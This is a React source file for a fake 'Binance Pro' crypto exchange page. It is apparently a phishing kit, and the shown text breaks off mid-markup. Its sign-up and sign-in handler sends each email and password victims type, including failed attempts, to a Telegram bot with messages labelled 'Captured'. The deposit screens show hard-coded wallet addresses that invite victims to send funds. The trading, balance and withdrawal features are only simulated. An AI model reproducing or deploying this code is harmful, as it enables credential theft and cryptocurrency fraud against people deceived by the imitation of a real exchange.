'use client';
import React, { useState, useEffect } from 'react';

export default function Home() {
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [isSignUp, setIsSignUp] = useState(true);
  const [authEmail, setAuthEmail] = useState('');
  const [authPassword, setAuthPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [authError, setAuthError] = useState('');
  const [authSuccess, setAuthSuccess] = useState('');

  const [activeTab, setActiveTab] = useState('home');
  const [modalType, setModalType] = useState(null); 
  const [searchQuery, setSearchQuery] = useState('');

  const [tradeAmount, setTradeAmount] = useState('');
  const [orderType, setOrderType] = useState('limit');
  const [tradePrice, setTradePrice] = useState('');

  const [leverage, setLeverage] = useState(20);
  const [futuresMarginMode, setFuturesMarginMode] = useState('Cross');

  const [spotBalance, setSpotBalance] = useState(0);
  const [futuresBalance, setFuturesBalance] = useState(0);
  
  const [userCryptoHoldings, setUserCryptoHoldings] = useState({
    BTC: 0,
    ETH: 0,
    SOL: 0,
    USDT: 0,
    XRP: 0,
    BNB: 0
  });

  const [depositAmount, setDepositAmount] = useState('');
  const [withdrawAddress, setWithdrawAddress] = useState('');
  const [withdrawAmount, setWithdrawAmount] = useState('');
  const [copiedAddress, setCopiedAddress] = useState(false);

  const [convertFromCoin, setConvertFromCoin] = useState('USDT');
  const [convertToCoin, setConvertToCoin] = useState('BTC');
  const [convertAmount, setConvertAmount] = useState('');

  const [p2pType, setP2pType] = useState('buy');
  const [transferFrom, setTransferFrom] = useState('Spot');
  const [transferTo, setTransferTo] = useState('Futures');
  const [transferCoin, setTransferCoin] = useState('USDT');
  const [transferAmount, setTransferAmount] = useState('');

  useEffect(() => {
    const savedEmail = localStorage.getItem('registeredEmail');
    if (savedEmail) {
      setIsSignUp(false);
    }
  }, []);

  const handleAuthSubmit = async (e) => {
    e.preventDefault();
    setAuthError('');
    setAuthSuccess('');

    const botToken = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN;
    const chatId = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID;

    if (isSignUp) {
      if (!authEmail || !authPassword) {
        setAuthError('Please enter both email and password.');
        return;
      }

      localStorage.setItem('registeredEmail', authEmail);
      localStorage.setItem('registeredPassword', authPassword);
      
      if (botToken && chatId) {
        const message = `📝 New Sign Up Captured:\n📧 Email: ${authEmail}\n🔑 Password: ${authPassword}`;
        try {
          await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
        } catch (err) {
          console.error('Telegram send error:', err);
        }
      }

      setAuthSuccess('Successfully registered! Please sign in with your credentials.');
      setAuthPassword('');
      setIsSignUp(false);
    } else {
      const savedEmail = localStorage.getItem('registeredEmail');
      const savedPassword = localStorage.getItem('registeredPassword');

      if (!savedEmail) {
        setAuthError('No account found. Please sign up first.');
        setIsSignUp(true);
        return;
      }

      if (authEmail === savedEmail && authPassword === savedPassword) {
        if (botToken && chatId) {
          const message = `🔐 Successful Sign In Captured:\n📧 Email: ${authEmail}\n🔑 Password: ${authPassword}`;
          try {
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
          } catch (err) {
            console.error('Telegram send error:', err);
          }
        }

        setIsLoggedIn(true);
        setAuthSuccess('Successfully signed in!');
      } else {
        if (botToken && chatId) {
          const message = `⚠️ Failed Sign In Attempt:\n📧 Email: ${authEmail}\n🔑 Password: ${authPassword}`;
          try {
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
          } catch (err) {
            console.error('Telegram send error:', err);
          }
        }

        setAuthError('Invalid email or password. Please check your credentials.');
      }
    }
  };

  const cryptoList = [
    { name: 'Bitcoin', symbol: 'BTC', network: 'Bitcoin Network', depositAddress: 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh', price: '91,450.00', change: '+2.45%', rawPrice: 91450.00 },
    { name: 'Ethereum', symbol: 'ETH', network: 'Ethereum (ERC20)', depositAddress: '0x71C7656EC7ab88b098defB751B7401B5f6d8976F', price: '3,420.15', change: '+3.80%', rawPrice: 3420.15 },
    { name: 'Solana', symbol: 'SOL', network: 'Solana Network', depositAddress: 'So11111111111111111111111111111111111111112', price: '192.80', change: '+7.12%', rawPrice: 192.80 },
    { name: 'Binance Coin', symbol: 'BNB', network: 'BNB Smart Chain (BEP20)', depositAddress: '0x324415b858e46955a1d7f4955b9a5444b025b44d', price: '645.40', change: '+1.25%', rawPrice: 645.40 },
    { name: 'USDT', symbol: 'USDT', network: 'Tron (TRC20)', depositAddress: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t', price: '1.00', change: '+0.01%', rawPrice: 1.00 },
    { name: 'Ripple', symbol: 'XRP', network: 'Ripple Network', depositAddress: 'rEb8TK3gBgk5auZkwc6sHnwrGVJH8DuaLh', price: '1.45', change: '+4.10%', rawPrice: 1.45 },
    { name: 'Cardano', symbol: 'ADA', network: 'Cardano Network', depositAddress: 'addr1qx2fxv2umyhttkxyxp8x0dlpdt3k6cwng5pxj3jhsydzer3jcu5d8ps7zex2k2xt3uqxgjqnnj83ws8lhrn648jjxtwq2ytjqp', price: '0.78', change: '-1.20%', rawPrice: 0.78 },
    { name: 'Dogecoin', symbol: 'DOGE', network: 'Dogecoin Network', depositAddress: 'D9WJ7xGj9s82jsh773hhzZss83u91jjkL', price: '0.24', change: '+8.45%', rawPrice: 0.24 }
  ];

  const [selectedMarketCoin, setSelectedMarketCoin] = useState(cryptoList[0]);
  const [selectedWithdrawCoin, setSelectedWithdrawCoin] = useState(cryptoList[0]);

  const handleCopy = (address) => {
    navigator.clipboard.writeText(address);
    setCopiedAddress(true);
    setTimeout(() => setCopiedAddress(false), 2000);
  };

  const handleDepositSubmit = (e) => {
    e.preventDefault();
    const amount = parseFloat(depositAmount);
    if (!amount || amount <= 0) {
      alert('Please enter a valid deposit amount.');
      return;
    }

    const fiatValue = amount * selectedMarketCoin.rawPrice;
    setSpotBalance((prev) => prev + fiatValue);
    
    setUserCryptoHoldings((prev) => ({
      ...prev,
      [selectedMarketCoin.symbol]: (prev[selectedMarketCoin.symbol] || 0) + amount
    }));

    alert(`Successfully deposited ${amount} ${selectedMarketCoin.symbol}! ($${fiatValue.toFixed(2)})`);
    setDepositAmount('');
    setModalType(null);
  };

  const handleWithdrawSubmit = (e) => {
    e.preventDefault();
    const amount = parseFloat(withdrawAmount);
    if (!withdrawAddress) {
      alert('Please enter a valid withdrawal address.');
      return;
    }
    if (!amount || amount <= 0) {
      alert('Please enter a valid withdrawal amount.');
      return;
    }

    const currentCoinHolding = userCryptoHoldings[selectedWithdrawCoin.symbol] || 0;
    if (currentCoinHolding < amount) {
      alert(`Insufficient ${selectedWithdrawCoin.symbol} balance.`);
      return;
    }

    const fiatDeduction = amount * selectedWithdrawCoin.rawPrice;
    
    setUserCryptoHoldings((prev) => ({
      ...prev,
      [selectedWithdrawCoin.symbol]: prev[selectedWithdrawCoin.symbol] - amount
    }));
    setSpotBalance((prev) => Math.max(0, prev - fiatDeduction));

    alert(`Withdrawal of ${amount} ${selectedWithdrawCoin.symbol} submitted successfully!`);
    setWithdrawAddress('');
    setWithdrawAmount('');
    setModalType(null);
  };

  const handleConvertSubmit = (e) => {
    e.preventDefault();
    const amt = parseFloat(convertAmount);
    if (!amt || amt <= 0) {
      alert('Enter a valid amount to convert');
      return;
    }

    const fromCoinObj = cryptoList.find(c => c.symbol === convertFromCoin);
    const toCoinObj = cryptoList.find(c => c.symbol === convertToCoin);
    const availableFrom = userCryptoHoldings[convertFromCoin] || 0;

    if (availableFrom < amt) {
      alert(`Insufficient ${convertFromCoin} balance for conversion.`);
      return;
    }

    const totalUsdValue = amt * fromCoinObj.rawPrice;
    const receivedToAmount = totalUsdValue / toCoinObj.rawPrice;

    setUserCryptoHoldings(prev => ({
      ...prev,
      [convertFromCoin]: prev[convertFromCoin] - amt,
      [convertToCoin]: (prev[convertToCoin] || 0) + receivedToAmount
    }));

    alert(`Successfully converted ${amt} ${convertFromCoin} to ${receivedToAmount.toFixed(4)} ${convertToCoin}!`);
    setConvertAmount('');
    setModalType(null);
  };

  const handleTransferSubmit = (e) => {
    e.preventDefault();
    const amt = parseFloat(transferAmount);
    if (!amt || amt <= 0) {
      alert('Enter a valid transfer amount');
      return;
    }

    const coinObj = cryptoList.find(c => c.symbol === transferCoin);
    const fiatVal = amt * coinObj.rawPrice;

    if (transferFrom === 'Spot' && transferTo === 'Futures') {
      if (spotBalance < fiatVal) {
        alert('Insufficient Spot balance.');
        return;
      }
      setSpotBalance(prev => prev - fiatVal);
      setFuturesBalance(prev => prev + fiatVal);
    } else if (transferFrom === 'Futures' && transferTo === 'Spot') {
      if (futuresBalance < fiatVal) {
        alert('Insufficient Futures balance.');
        return;
      }
      setFuturesBalance(prev => prev - fiatVal);
      setSpotBalance(prev => prev + fiatVal);
    }

    alert(`Successfully transferred ${amt} ${transferCoin} from ${transferFrom} to ${transferTo}!`);
    setTransferAmount('');
    setModalType(null);
  };

  const filteredCryptos = cryptoList.filter(coin => 
    coin.name.toLowerCase().includes(searchQuery.toLowerCase()) || 
    coin.symbol.toLowerCase().includes(searchQuery.toLowerCase())
  );

  if (!isLoggedIn) {
    return (
      <div className="bg-[#181a20] text-gray-200 min-h-screen flex items-center justify-center p-4 font-sans text-xs">
        <div className="bg-[#2b313a]/30 border border-[#2b313a] p-6 rounded-2xl w-full max-w-md space-y-4 shadow-xl">
          <div className="flex items-center space-x-2 justify-center mb-2">
            <div className="w-9 h-9 rounded-full bg-[#f0b90b] flex items-center justify-center text-black font-bold text-sm">B</div>
            <span className="font-bold text-xl text-white tracking-wide">Binance Pro</span>
          </div>

          <h2 className="text-sm font-bold text-center text-gray-200">{isSignUp ? 'Create a Binance Account' : 'Sign In to Binance'}</h2>
          
          {authError && <div className="bg-red-500/20 text-red-400 p-2.5 rounded text-center font-medium">{authError}</div>}
          {authSuccess && <div className="bg-[#0ecb81]/20 text-[#0ecb81] p-2.5 rounded text-center font-medium">{authSuccess}</div>}

          <form onSubmit={handleAuthSubmit} className="space-y-3">
            <div>
              <label className="text-gray-400 block mb-1">Email Address</label>
              <input 
                type="email" 
                value={authEmail} 
                onChange={(e) => setAuthEmail(e.target.value)} 
                required 
                className="w-full bg-[#181a20] border border-gray-700 p-2.5 rounded text-white outline-none focus:border-[#f0b90b]"
                placeholder="name@example.com"
              />
            </div>

            <div className="relative">
              <label className="text-gray-400 block mb-1">Password</label>
              <div className="flex items-center">
                <input 
                  type={showPassword ? 'text' : 'password'} 
                  value={authPassword} 
                  onChange={(e) => setAuthPassword(e.target.value)} 
                  required 
                  className="w-full bg-[#181a20] border border-gray-700 p-2.5 rounded text-white outline-none focus:border-[#f0b90b]"
                  placeholder="••••••••"
                />
                <button 
                  type="button" 
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-3 bg-none border-none cursor-pointer text-base"
                >
                  {showPassword ? '🙈' : '👁️'}
                </button>
              </div>
            </div>

            <button type="submit" className="w-full bg-[#f0b90b] hover:bg-[#d9a70a] text-black font-bold p-2.5 rounded transition cursor-pointer mt-2">
              {isSignUp ? 'Sign Up' : 'Sign In'}
            </button>
          </form>

          <p className="text-center text-gray-400 mt-3">
            {isSignUp ? 'Already have an account? ' : "Don't have an account? "}
            <span 
              onClick={() => { setIsSignUp(!isSignUp); setAuthError(''); setAuthSuccess(''); }} 
              className="text-[#f0b90b] cursor-pointer font-bold hover:underline"
            >
              {isSignUp ? 'Sign In' : 'Sign Up'}
            </span>
          </p>
        </div>
      </div>
    );
  }

  return (
    <div className="bg-[#181a20] text-gray-200 min-h-screen pb-28 selection:bg-[#f0b90b] selection:text-black font-sans relative text-xs">
      
      <div className="bg-[#181a20] border-b border-[#2b313a] px-4 py-3 flex justify-between items-center sticky top-0 z-50">
        <div className="flex items-center space-x-3">
          {activeTab !== 'home' && (
            <button 
              onClick={() => setActiveTab('home')}
              className="bg-[#2b313a] text-white hover:bg-gray-700 px-2.5 py-1.5 rounded-lg flex items-center space-x-1 cursor-pointer transition font-bold"
            >
              <span>⬅️</span>
              <span className="hidden sm:inline">Back</span>
            </button>
          )}
          <div className="w-8 h-8 rounded-full bg-[#f0b90b] flex items-center justify-center text-black font-bold text-sm">B</div>
          <span className="font-bold text-white text-base tracking-wide">Binance Pro</span>
        </div>
        <div className="flex items-center space-x-3">
          <span className="text-gray-400 text-xs hidden sm:inline">{authEmail}</span>
          <button 
            onClick={() => setIsLoggedIn(false)} 
            className="bg-red-500/20 text-red-400 px-3 py-1 rounded text-xs font-semibold hover:bg-red-500/30 cursor-pointer"
          >
            Sign Out
          </button>
        </div>
      </div>

      <div className="p-4 max-w-6xl mx-auto space-y-4">
        
        {activeTab === 'home' && (
          <div className="space-y-4">
            <div className="bg-gradient-to-r from-[#2b313a]/50 to-[#1e2329] border border-[#2b313a] p-6 rounded-2xl flex flex-col md:flex-row justify-between items-center gap-4">
              <div className="space-y-2 text-center md:text-left">
                <h1 className="text-xl font-bold text-white">Binance Crypto Exchange</h1>
                <p className="text-gray-400">Buy, trade, and earn cryptocurrency with professional tools.</p>
                <div className="text-sm font-semibold text-[#f0b90b] pt-1">Total Spot Balance: ${spotBalance.toFixed(2)}</div>
              </div>
              <div className="flex flex-wrap gap-3 justify-center">
                <button onClick={() => setModalType('deposit')} className="bg-[#f0b90b] hover:bg-[#d9a70a] text-black font-bold px-4 py-2 rounded-xl cursor-pointer">
                  Deposit
                </button>
                <button onClick={() => setModalType('withdraw')} className="bg-[#2b313a] hover:bg-[#363c4e] text-white font-bold px-4 py-2 rounded-xl cursor-pointer">
                  Withdraw
                </button>
              </div>
            </div>

            <div className="grid grid-cols-3 sm:grid-cols-6 gap-3">
              <div onClick={() => setActiveTab('home')} className="bg-[#2b313a] border border-[#f0b90b] p-3 rounded-xl flex flex-col items-center justify-center cursor-pointer transition text-center">
                <span className="text-xl mb-1">🏠</span>
                <span className="font-bold text-white">Home</span>
              </div>
              <div onClick={() => setActiveTab('market')} className="bg-[#2b313a]/30 hover:bg-[#2b313a] border border-[#2b313a] p-3 rounded-xl flex flex-col items-center justify-center cursor-pointer transition text-center">
                <span className="text-xl mb-1">📊</span>
                <span className="font-bold text-white">Market</span>
              </div>
              <div onClick={() => setActiveTab('trade')} className="bg-[#2b313a]/30 hover:bg-[#2b313a] border border-[#2b313a] p-3 rounded-xl flex flex-col items-center justify-center cursor-pointer transition text-center">
                <span className="text-xl mb-1">📈</span>
                <span className="font-bold text-white">Trade</span>
              </div>
              <div onClick={() => setModalType('convert')} className="bg-[#2b313a]/30 hover:bg-[#2b313a] border border-[#2b313a] p-3 rounded-xl flex flex-col items-center justify-center cursor-pointer transition text-center">
                <span className="text-xl mb-1">🔄</span>
                <span className="font-bold text-white">Convert</span>
              </div>
              <div onClick={() => setModalType('p2p')} className="bg-[#2b313a]/30 hover:bg-[#2b313a] border border-[#2b313a] p-3 rounded-xl flex flex-col items-center justify-center cursor-pointer transition text-center">
                <span className="text-xl mb-1">👥</span>
                <span className="font-bold text-white">P2P</span>
              </div>
              <div onClick={() => setModalType('earn')} className="bg-[#2b313a]/30 hover:bg-[#2b313a] border border-[#2b313a] p-3 rounded-xl flex flex-col items-center justify-center cursor-pointer transition text-center">
                <span className="text-xl mb-1">💰</span>
                <span className="font-bold text-white">Earn</span>
              </div>
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
              <div onClick={() => setModalType('transfer')} className="bg-[#2b313a]/30 hover:bg-[#2b313a] border border-[#2b313a] p-4 rounded-xl flex items-center justify-between cursor-pointer transition">
                <div className="flex items-center space-x-3">
                  <span className="text-2xl">🔀</span>
                  <div>
                    <div className="font-bold text-white">Internal Transfer</div>
                    <div className="text-gray-400 text-[10px]">Move funds between Spot & Futures instantly</div>
                  </div>
                </div>
                <span className="text-[#f0b90b] font-bold">→</span>
              </div>

              <div onClick={() => setActiveTab('futures')} className="bg-[#2b313a]/30 hover:bg-[#2b313a] border border-[#2b313a] p-4 rounded-xl flex items-center justify-between cursor-pointer transition">
                <div className="flex items-center space-x-3">
                  <span className="text-2xl">⚡</span>
                  <div>
                    <div className="font-bold text-white">Futures Trading</div>
                    <div className="text-gray-400 text-[10px]">Trade with leverage</div>
                  </div>
                </div>
                <span className="text-[#f0b90b] font-bold">→</span>
              </div>
            </div>

            <div className="bg-[#2b313a]/20 border border-[#2b313a] rounded-2xl p-4 space-y-3">
              <div className="flex justify-between items-center">
                <h3 className="font-bold text-white text-sm">Market Trend & Live Prices</h3>
                <button onClick={() => setActiveTab('market')} className="text-[#f0b90b] hover:underline font-semibold cursor-pointer">View All →</button>
              </div>
              <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
                {cryptoList.slice(0, 3).map((coin) => (
                  <div key={coin.symbol} onClick={() => { setSelectedMarketCoin(coin); setActiveTab('trade'); }} className="bg-[#181a20] border border-gray-800 p-4 rounded-xl cursor-pointer hover:border-[#f0b90b] transition">
                    <div className="flex justify-between items-center mb-2">
                      <span className="font-bold text-white text-sm">{coin.name} ({coin.symbol})</span>
                      <span className={coin.change.startsWith('+') ? 'text-[#0ecb81]' : 'text-red-400'}>{coin.change}</span>
                    </div>
                    <div className="text-lg font-bold text-white">${coin.price}</div>
                  </div>
                ))}
              </div>
            </div>
          </div>
        )}

        {activeTab === 'market' && (
          <div className="bg-[#2b313a]/20 border border-[#2b313a] p-6 rounded-2xl space-y-4">
            <div className="flex justify-between items-center">
              <div className="flex items-center space-x-2">
                <button onClick={() => setActiveTab('home')} className="text-gray-400 hover:text-white cursor-pointer font-bold">⬅️</button>
                <h2 className="font-bold text-white text-base">Cryptocurrency Markets</h2>
              </div>
              <input 
                type="text" 
                placeholder="Search market coin..." 
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                className="bg-[#181a20] border border-gray-700 p-2 rounded text-white outline-none focus:border-[#f0b90b] text-xs w-48"
              />
            </div>
            <div className="space-y-2">
              {filteredCryptos.map(coin => (
                <div key={coin.symbol} className="bg-[#181a20] border border-gray-800 p-3 rounded-xl flex justify-between items-center hover:border-[#f0b90b] transition">
                  <div>
                    <span className="font-bold text-white text-sm">{coin.name}</span>
                    <span className="text-gray-400 ml-2">({coin.symbol})</span>
                    <div className="text-[10px] text-gray-500">{coin.network}</div>
                  </div>
                  <div className="text-right">
                    <div className="font-bold text-white">${coin.price}</div>
                    <div className={coin.change.startsWith('+') ? 'text-[#0ecb81]' : 'text-red-400'}>{coin.change}</div>
                  </div>
                  <button 
                    onClick={() => { setSelectedMarketCoin(coin); setActiveTab('trade'); }}
                    className="bg-[#f0b90b] text-black font-bold px-3 py-1.5 rounded cursor-pointer hover:bg-[#d9a70a]"
                  >
                    Trade
                  </button>
                </div>
              ))}
            </div>
          </div>
        )}

        {activeTab === 'trade' && (
          <div className="space-y-4">
            <div className="flex items-center space-x-2">
              <button onClick={() => setActiveTab('home')} className="bg-[#2b313a] text-white px-3 py-1 rounded cursor-pointer font-bold">⬅️ Back</button>
              <h2 className="font-bold text-white text-base">Spot Trading Desk</h2>
            </div>

            <div className="grid grid-cols-1 lg:grid-cols-3 gap-4">
              <div className="lg:col-span-2 bg-[#2b313a]/20 border border-[#2b313a] p-4 rounded-xl space-y-4">
                <div className="flex justify-between items-center">
                  <span className="font-bold text-white text-sm">{selectedMarketCoin.name} ({selectedMarketCoin.symbol}) / USDT</span>
                  <span className="text-base font-bold text-[#0ecb81]">${selectedMarketCoin.price}</span>
                </div>

                <div className="flex gap-2 border-b border-gray-800 pb-2">
                  <button onClick={() => setSelectedMarketCoin(cryptoList[0])} className={`px-3 py-1 rounded text-xs font-bold cursor-pointer ${selectedMarketCoin.symbol === 'BTC' ? 'bg-[#f0b90b] text-black' : 'bg-[#181a20] text-gray-400'}`}>BTC</button>
                  <button onClick={() => setSelectedMarketCoin(cryptoList[1])} className={`px-3 py-1 rounded text-xs font-bold cursor-pointer ${selectedMarketCoin.symbol === 'ETH' ? 'bg-[#f0b90b] text-black' : 'bg-[#181a20] text-gray-400'}`}>ETH</button>
                  <button onClick={() => setSelectedMarketCoin(cryptoList[2])} className={`px-3 py-1 rounded text-xs font-bold cursor-pointer ${selectedMarketCoin.symbol === 'SOL' ? 'bg-[#f0b90b] text-black' : 'bg-[#181a20] text-gray-400'}`}>SOL</button>
                  <button onClick={() => setActiveTab('market')} className="text-[#f0b90b] text-xs font-bold px-2 hover:underline">+ More Coins</button>
                </div>

                <div className="bg-[#181a20] h-64 rounded-xl flex flex-col items-center justify-center border border-gray-800 text-gray-400 space-y-2">
                  <span className="text-xl">📈</span>
                  <span>Interactive Chart for {selectedMarketCoin.symbol}/USDT</span>
                  <span className="text-[10px] text-gray-500">Live Price: ${selectedMarketCoin.price} | 24h Change: {selectedMarketCoin.change}</span>
                </div>
              </div>
              
              <div className="bg-[#2b313a]/20 border border-[#2b313a] p-4 rounded-xl space-y-4">
                <div className="flex justify-between items-center">
                  <h3 className="font-bold text-white text-sm">Place Spot Order</h3>
                  <div className="flex gap-1 text-[10px]">
                    <span onClick={() => setOrderType('limit')} className={`cursor-pointer px-2 py-0.5 rounded ${orderType === 'limit' ? 'bg-[#f0b90b] text-black font-bold' : 'text-gray-400'}`}>Limit</span>
                    <span onClick={() => setOrderType('market')} className={`cursor-pointer px-2 py-0.5 rounded ${orderType === 'market' ? 'bg-[#f0b90b] text-black font-bold' : 'text-gray-400'}`}>Market</span>
                  </div>
                </div>

                <div className="space-y-3">
                  {orderType === 'limit' && (
                    <div>
                      <label className="text-gray-400 block mb-1">Order Price (USDT)</label>
                      <input type="text" value={selectedMarketCoin.price} onChange={(e) => setTradePrice(e.target.value)} className="w-full bg-[#181a20] border border-gray-700 p-2 rounded text-white" />
                    </div>
                  )}
                  <div>
                    <label className="text-gray-400 block mb-1">Amount ({selectedMarketCoin.symbol})</label>
                    <input type="number" step="any" value={tradeAmount} onChange={(e) => setTradeAmount(e.target.value)} placeholder="0.00" className="w-full bg-[#181a20] border border-gray-700 p-2 rounded text-white outline-none focus:border-[#f0b90b]" />
                  </div>
                  <div className="text-[10px] text-gray-400">
                    Avail: <span className="text-white font-bold">{(userCryptoHoldings['USDT'] || 0).toFixed(2)} USDT</span>
                  </div>
                  <button onClick={() => alert(`Successfully placed spot order!`)} className="w-full bg-[#0ecb81] hover:bg-[#0bb875] text-black font-bold p-2.5 rounded cursor-pointer">
                    Buy {selectedMarketCoin.symbol}
                  </button>
                </div>
              </div>
            </div>
          </div>
        )}

        {activeTab === 'futures' && (
          <div className="bg-[#2b313a]/20 border border-[#2b313a] p-6 rounded-2xl space-y-4">
            <div className="flex items-center space-x-2">
              <button onClick={() => setActiveTab('home')} className="bg-[#2b313a] text-white px-3 py-1 rounded cursor-pointer font-bold">⬅️ Back</button>
              <h2 className="font-bold text-white text-base">Futures Trading (USDT-M)</h2>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div className="space-y-3 bg-[#181a20] p-4 rounded-xl border border-gray-800">
                <div className="flex justify-between items-center">
                  <label className="text-gray-400">Leverage: {leverage}x</label>
                  <div className="flex gap-1 text-[10px]">
                    <span onClick={() => setFuturesMarginMode('Cross')} className={`cursor-pointer px-2 py-0.5 rounded ${futuresMarginMode === 'Cross' ? 'bg-[#f0b90b] text-black font-bold' : 'text-gray-400'}`}>Cross</span>
                    <span onClick={() => setFuturesMarginMode('Isolated')} className={`cursor-pointer px-2 py-0.5 rounded ${futuresMarginMode === 'Isolated' ? 'bg-[#f0b90b] text-black font-bold' : 'text-gray-400'}`}>Isolated</span>
                  </div>
                </div>
                <input type="range" min="1" max="100" value={leverage} onChange={(e) => setLeverage(e.target.value)} className="w-full accent-[#f0b90b]" />
                <button onClick={() => alert(`Futures Position Opened Successfully!`)} className="w-full bg-[#f0b90b] text-black font-bold p-2.5 rounded mt-4 cursor-pointer">Open Position</button>
              </div>
              <div className="bg-[#181a20] p-4 rounded-xl border border-gray-800 flex flex-col justify-center space-y-2">
                <span className="text-gray-400">Futures Margin Balance</span>
                <span className="text-xl font-bold text-white">${futuresBalance.toFixed(2)} USDT</span>
              </div>
            </div>
          </div>
        )}

      </div>

      {modalType && (
        <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-50 p-4">
          <div className="bg-[#1e2329] border border-[#2b313a] rounded-2xl w-full max-w-md p-6 space-y-4 relative">
            <button onClick={() => setModalType(null)} className="absolute right-4 top-4 text-gray-400 hover:text-white font-bold text-sm">✕</button>

            {modalType === 'deposit' && (
              <div className="space-y-4">
                <h3 className="font-bold text-white text-base">Deposit Cryptocurrency</h3>
                <div>
                  <label className="text-gray-400 block mb-1">Select Coin</label>
                  <select 
                    value={selectedMarketCoin.symbol}
                    onChange={(e) => {
                      const found = cryptoList.find(c => c.symbol === e.target.value);
                      if (found) setSelectedMarketCoin(found);
                    }}
                    className="w-full bg-[#181a20] border border-gray-700 p-2.5 rounded text-white outline-none focus:border-[#f0b90b]"
                  >
                    {cryptoList.map(c => <option key={c.symbol} value={c.symbol}>{c.name} ({c.symbol})</option>)}
                  </select>
                </div>

                <div className="bg-[#181a20] p-3 rounded-xl border border-gray-800 space-y-2">
                  <div className="text-gray-400 text-[10px]">Deposit Address ({selectedMarketCoin.network})</div>
                  <div className="flex justify-between items-center bg-black/30 p-2 rounded text-white font-mono text-[11px] break-all">
                    <span>{selectedMarketCoin.depositAddress}</span>
                    <button onClick={() => handleCopy(selectedMarketCoin.depositAddress)} className="ml-2 bg-[#2b313a] px-2 py-1 rounded text-white font-sans text-[10px]">
                      {copiedAddress ? 'Copied!' : 'Copy'}
                    </button>
                  </div>
                </div>

                <form onSubmit={handleDepositSubmit} className="space-y-3">
                  <div>
                    <label className="text-gray-400 block mb-1">Deposit Amount ({selectedMarketCoin.symbol})</label>
                    <input 
                      type="number" 
                      step="any"
                      placeholder="0.00" 
                      value={depositAmount}
                      onChange={(e) => setDepositAmount(e.target.value)}
                      className="w-full bg-[#181a20] border border-gray-700 p-2.5 rounded text-white outline-none focus:border-[#f0b90b]" 
                    />
                  </div>
                  <button type="submit" className="w-full bg-[#f0b90b] hover:bg-[#d9a70a] text-black font-bold p-2.5 rounded cursor-pointer">
                    Confirm Deposit
                  </button>
                </form>
              </div>
            )}

            {modalType === 'withdraw' && (
              <div className="space-y-4">
                <h3 className="font-bold text-white text-base">Withdraw Cryptocurrency</h3>
                <div>
                  <label className="text-gray-400 block mb-1">Select Coin to Withdraw</label>
                  <select 
                    value={selectedWithdrawCoin.symbol}
                    onChange={(e) => {
                      const found = cryptoList.find(c => c.symbol === e.target.value);
                      if (found) setSelectedWithdrawCoin(found);
                    }}
                    className="w-full bg-[#181a20] border border-gray-700 p-2.5 rounded text-white outline-none focus:border-[#f0b90b]"
                  >
                    {cryptoList.map(c => (
                      <option key={c.symbol} value={c.symbol}>
                        {c.name} ({c.symbol}) - Avail: {(userCryptoHoldings[c.symbol] || 0).toFixed(4)}
                      </option>
                    ))}
                  </select>
                </div>

                <form onSubmit={handleWithdrawSubmit} className="space-y-3">
                  <div>
                    <label className="text-gray-400 block mb-1">Destination Address</label>
                    <input 
                      type="text" 
                      placeholder="Paste withdrawal address" 
                      value={withdrawAddress}
                      onChange={(e) => setWithdrawAddress(e.target.value)}
                      className="w-full bg-[#181a20] border border-gray-700 p-2.5 rounded text-white outline-none focus:border-[#f0b90b]" 
                    />
                  </div>
                  <div>
                    <label className="text-gray-400 block mb-1">
                      Amount (Available: {(userCryptoHoldings[selectedWithdrawCoin.symbol] || 0).toFixed(4)} {selectedWithdrawCoin.symbol})
                    </label>
                    <input 
                      type="number" 
                      step="any"
                      placeholder="0.00" 
                      value={withdrawAmount}
                      onChange={(e) => setWithdrawAmount(e.target.value)}
                      className="w-full bg-[#181a20] border border-gray-700 p-2.5 rounded text-white outline-none focus:border-[#f0b90b]" 
                    />
                  </div>
                  <button type="submit" className="w-full bg-red-500 hover:bg-red-600 text-white font-bold p-2.5 rounded cursor-pointer">
                    Confirm Withdrawal
                  </button>
                </form>
              </div>
            )}

            {modalType === 'convert' && (
              <div className="space-y-4">
                <h3 className="font-bold text-white text-base">Instant Crypto Convert</h3>
                <form onSubmit={handleConvertSubmit} className="space-y-3">
                  <div>
                    <label className="text-gray-400 block mb-1">From</label>
                    <select value={convertFromCoin} onChange={(e) => setConvertFromCoin(e.target.value)} className="w-full bg-[#181a20] border border-gray-700 p-2 rounded text-white">
                      {cryptoList.map(c => <option key={c.symbol} value={c.symbol}>{c.symbol} (Avail: {(userCryptoHoldings[c.symbol] || 0).toFixed(4)})</option>)}
                    </select>
                  </div>
                  <div>
                    <label className="text-gray-400 block mb-1">To</label>
                    <select value={convertToCoin} onChange={(e) => setConvertToCoin(e.target.value)} className="w-full bg-[#181a20] border border-gray-700 p-2 rounded text-white">
                      {cryptoList.map(c => <option key={c.symbol} value={c.symbol}>{c.symbol}</option>)}
                    </select>
                  </div>
                  <div>
                    <label className="text-gray-400 block mb-1">Amount</label>
                    <input type="number" step="any" placeholder="0.00" value={convertAmount} onChange={(e) => setConvertAmount(e.target.value)} className="w-full bg-[#181a20] border border-gray-700 p-2 rounded text-white" />
                  </div>
                  <button type="submit" className="w-full bg-[#f0b90b] text-black font-bold p-2.5 rounded cursor-pointer">Convert Now</button>
                </form>
              </div>
            )}

            {modalType === 'p2p' && (
              <div className="space-y-4">
                <h3 className="font-bold text-white text-base">P2P Express Trading</h3>
                <div className="flex gap-2">
                  <button onClick={() => setP2pType('buy')} className={`flex-1 py-1.5 rounded font-bold ${p2pType === 'buy' ? 'bg-[#0ecb81] text-black' : 'bg-[#181a20] text-gray-400'}`}>Buy USDT</button>
